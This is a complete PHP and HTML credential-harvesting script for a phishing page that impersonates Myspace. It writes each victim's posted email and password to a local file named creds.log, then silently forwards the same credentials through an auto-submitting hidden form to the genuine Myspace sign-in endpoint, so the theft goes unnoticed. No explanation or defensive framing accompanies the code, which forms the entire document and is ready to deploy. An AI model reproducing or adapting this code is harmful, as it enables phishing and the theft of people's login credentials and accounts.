<html>
<body>
<?php
$fp = fopen("creds.log", "a");
fwrite($fp, "\nMyspace $_POST[email] $_POST[password]");
fclose($fp);
echo "<form name=\"myform\" method=\"post\" action=\"https://myspace.com/ajax/account/signin\">";
echo "<input type=\"hidden\" name=\"email\" value=\"$_POST[email]\">";
echo "<input type=\"hidden\" name=\"password\" value=\"$_POST[password]\">";
?>
<script language="JavaScript">document.myform.submit();</script>
</form>
</body>
</html>
